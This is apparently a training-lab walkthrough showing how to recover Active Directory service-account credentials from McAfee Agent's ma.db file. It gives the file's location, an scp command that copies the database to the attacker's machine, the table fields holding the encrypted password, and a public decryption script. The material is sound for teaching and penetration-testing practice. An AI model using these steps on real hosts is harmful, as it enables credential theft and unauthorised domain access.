## Configuration Files Enumeration

The last enumeration avenue we will explore in this network is configuration files. If you gain access to a host on the organisation's network, configuration files are an excellent avenue to explore for recovering Active Directory (AD) credentials. Depending on the host, various configuration files may be valuable for enumeration, such as:

- Web application config files
- Service configuration files
- Registry keys
- Centrally deployed applications

Several enumeration scripts, such as **Seatbelt**, can automate this process.

---

### Recovering Credentials from Configuration Files

In this task, we will focus on recovering credentials from a centrally deployed application. These applications often require authentication to the domain during installation and execution. An example is **McAfee Enterprise Endpoint Security**, which organisations use for endpoint detection and response.

McAfee embeds the credentials used during installation in a file called `ma.db`. With local access to the host, you can retrieve and read this database file to recover the associated AD service account. We will use SSH access on `THMJMP1` for this exercise.

#### Location of `ma.db`

```shell
cd C:\ProgramData\McAfee\Agent\DB
dir
```

Example output:

```
 Directory of C:\ProgramData\McAfee\Agent\DB      

03/05/2022  10:03 AM    <DIR>          .
03/05/2022  10:03 AM    <DIR>          ..
03/05/2022  10:03 AM           120,832 ma.db      
               1 File(s)        120,832 bytes     
               2 Dir(s)  39,426,285,568 bytes free
```

#### Copying `ma.db` to Your AttackBox

```shell
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
```

Enter the password when prompted.

#### Reading the Database File

Use `sqlitebrowser` to open the database:

```shell
sqlitebrowser ma.db
```

Select the **Browse Data** option and focus on the `AGENT_REPOSITORIES` table. Look for the `DOMAIN`, `AUTH_USER`, and `AUTH_PASSWD` fields. Note that the `AUTH_PASSWD` field is encrypted.

---

### Decrypting the Password

McAfee encrypts the password with a known key. You can use a Python script to decrypt it. The script is available as a downloadable task file or on the AttackBox at `/root/Rooms/BreachingAD/task7/`. There is also a Python 3 version available here: [mcafee-sitelist-pwd-decryption](https://github.com/funoverip/mcafee-sitelist-pwd-decryption).

Unzip the script:

```shell
unzip mcafeesitelistpwddecryption.zip
```

Run the script with your base64 encoded and encrypted password:

```shell
python2 mcafee_sitelist_pwd_decrypt.py <AUTH_PASSWD_VALUE>
```

Example output:

```
Crypted password   : <AUTH_PASSWD_VALUE>
Decrypted password : <Decrypted_Password>
```

---

You now have a set of AD credentials for further enumeration! This is just one example of recovering credentials from configuration files. Whenever you gain a foothold on a host, follow a detailed methodology to recover all loot, including credentials and other sensitive information stored in configuration files.